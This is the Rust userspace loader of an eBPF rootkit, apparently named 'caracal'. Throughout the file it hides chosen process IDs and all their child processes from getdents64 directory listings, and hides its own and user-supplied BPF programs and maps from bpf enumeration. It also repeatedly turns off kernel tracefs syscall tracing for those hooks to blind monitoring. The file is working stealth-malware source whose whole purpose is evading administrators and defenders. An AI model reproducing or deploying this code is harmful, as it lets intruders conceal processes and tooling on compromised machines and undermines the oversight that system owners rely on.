use std::{thread, time::Duration};

use aya::{maps::HashMap, EbpfLoader};
use caracal::utils::{
    fetch_progs_ids_map_ids, get_descendants, get_progs_info_from_progs_ids, list_active_maps,
    list_active_programs, write_to_tracefs, Builder, SyscallTracepoint,
};
use caracal_common::{MAX_BPF_OBJ, MAX_HIDDEN_PIDS};
use clap::Parser;
use log::{debug, info, warn};
use sysinfo::{Pid, ProcessesToUpdate, System};
use tokio::signal;

#[derive(Debug, Parser)]
struct Opt {
    #[clap(long, value_delimiter = ',', required = true)]
    pid: Vec<u32>,
    #[clap(long, value_delimiter = ',', required = false)]
    bpf_prog_id: Vec<u32>,
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let Opt { pid, bpf_prog_id } = Opt::parse();
    env_logger::init();

    if unsafe { libc::geteuid() } != 0 {
        eprintln!("This program must be run as root");
        std::process::exit(1);
    }

    let rlim = libc::rlimit {
        rlim_cur: libc::RLIM_INFINITY,
        rlim_max: libc::RLIM_INFINITY,
    };
    let ret = unsafe { libc::setrlimit(libc::RLIMIT_MEMLOCK, &rlim) };
    if ret != 0 {
        debug!("remove limit on locked memory failed, ret is: {ret}");
    }

    let tracepoints = vec![
        SyscallTracepoint::from(("caracal_bpf", "sys_enter_bpf")),
        SyscallTracepoint::from(("caracal_pid_enter", "sys_enter_getdents64")),
        SyscallTracepoint::from(("caracal_pid_exit", "sys_exit_getdents64")),
    ];

    let mut ebpf = EbpfLoader::new().load(aya::include_bytes_aligned!(
        "../../target/bpfel-unknown-none/release/caracal"
    ))?;
    if let Err(e) = aya_log::EbpfLogger::init(&mut ebpf) {
        warn!("failed to initialize eBPF logger: {e}");
    }
    let mut builder = Builder {
        ebpf: &mut ebpf,
        tracepoints,
    };

    // get bpf prog info used in caracal
    let mut bpf_progs_info = builder.build()?;

    // add user-provided prog_info
    bpf_progs_info.append(&mut get_progs_info_from_progs_ids(bpf_prog_id));

    let full_bpf_info = fetch_progs_ids_map_ids(bpf_progs_info)?;

    // setup HIDDEN_PIDS MAP
    let mut hidden_pids_map: HashMap<_, u32, u8> =
        HashMap::try_from(ebpf.take_map("HIDDEN_PIDS").unwrap()).unwrap();

    // setup HIDDEN_OBJ MAP  0:prog_ids 1:map_ids
    let mut hidden_obj_map: HashMap<_, u32, [u32; MAX_BPF_OBJ as usize]> =
        HashMap::try_from(ebpf.take_map("HIDDEN_BPF_OBJ").unwrap()).unwrap();
    let mut hidden_progs = [0u32; MAX_BPF_OBJ as usize];
    for (idx, m) in full_bpf_info.prog_ids.iter().enumerate() {
        hidden_progs[idx] = *m
    }
    let mut hidden_maps = [0u32; MAX_BPF_OBJ as usize];
    for (idx, m) in full_bpf_info.map_ids.iter().enumerate() {
        hidden_maps[idx] = *m
    }
    hidden_obj_map.insert(0, hidden_progs, 0).unwrap();
    hidden_obj_map.insert(1, hidden_maps, 0).unwrap();

    //setup skip MAPS
    let mut prog_skip_map: HashMap<_, u32, u32> =
        HashMap::try_from(ebpf.take_map("PROG_SKIP").unwrap()).unwrap();
    let mut map_skip_map: HashMap<_, u32, u32> =
        HashMap::try_from(ebpf.take_map("MAP_SKIP").unwrap()).unwrap();
    let prog_ids = full_bpf_info.prog_ids;
    let map_ids = full_bpf_info.map_ids;

    for p in prog_ids.clone() {
        info!("bpf prog: {p} -> hide")
    }
    for m in map_ids.clone() {
        info!("bpf  map: {m} -> hide")
    }

    // keep skip-maps updated
    thread::spawn({
        move || loop {
            thread::sleep(Duration::from_millis(1000));
            let mut prev_id: u32 = 0;
            let active_programs = list_active_programs();
            let n_active_maps = active_programs.len();
            for (idx, m) in active_programs.iter().enumerate() {
                for to_skip_prog in prog_ids.iter() {
                    if m == to_skip_prog {
                        let to_insert_prog_id: u32 = match idx < n_active_maps {
                            true => {
                                let mut id = *to_skip_prog;
                                for next_id in active_programs.as_slice()[idx..].iter() {
                                    if !prog_ids.contains(next_id) {
                                        id = *next_id;
                                        break;
                                    }
                                }
                                id
                            }
                            false => *to_skip_prog,
                        };
                        prog_skip_map.insert(prev_id, to_insert_prog_id, 0).unwrap();
                        break;
                    }
                }
                prev_id = *m;
            }

            let mut prev_id: u32 = 0;
            let active_maps = list_active_maps();
            let n_active_maps = active_maps.len();
            for (idx, m) in active_maps.iter().enumerate() {
                for to_skip_map in map_ids.iter() {
                    if m == to_skip_map {
                        let to_insert_map_id: u32 = match idx < n_active_maps {
                            true => {
                                let mut id = *to_skip_map;
                                for next_id in active_maps.as_slice()[idx..].iter() {
                                    if !map_ids.contains(next_id) {
                                        id = *next_id;
                                        break;
                                    }
                                }
                                id
                            }
                            false => *to_skip_map,
                        };

                        map_skip_map.insert(prev_id, to_insert_map_id, 0).unwrap();
                        break;
                    }
                }
                prev_id = *m;
            }
        }
    });

    // setup pid trees to hide
    let mut sys = System::new_all();
    let _ = sys.refresh_processes(ProcessesToUpdate::All, true);

    for p in pid.iter() {
        info!("pid: {p} -> hide");
        hidden_pids_map
            .insert(p, 0, 0)
            .unwrap_or_else(|_| panic!("TOO MANY PIDS PROVIDED (max {MAX_HIDDEN_PIDS})"));
        let children = get_descendants(&sys, Pid::from(*p as usize));
        for child in children.iter() {
            if let Some(task) = sys.process(*child) {
                info!("pid: {} -> hide child: {} [{:?}]", p, child, task.name());
            } else {
                info!("pid: {p} -> hide child: {child}");
            }
            info!("{}", child.as_u32());
            hidden_pids_map
                .insert(child.as_u32(), 0, 0)
                .unwrap_or_else(|_| panic!("TOO MANY PIDS PROVIDED (max {MAX_HIDDEN_PIDS})"));
        }
    }

    // discourage tracing
    thread::spawn({
        move || loop {
            thread::sleep(Duration::from_millis(250));
            for syscall in ["bpf", "getdents64"] {
                for hook in ["enter", "exit"] {
                    if let Err(err) = write_to_tracefs(
                        "0",
                        &format!(
                            "/sys/kernel/debug/tracing/events/syscalls/sys_{hook}_{syscall}/enable",
                        ),
                    ) {
                        println!("error: {err}");
                    };
                }
            }
        }
    });
    let ctrl_c = signal::ctrl_c();
    println!("Waiting for Ctrl-C...");
    ctrl_c.await?;
    println!("Exiting...");

    Ok(())
}
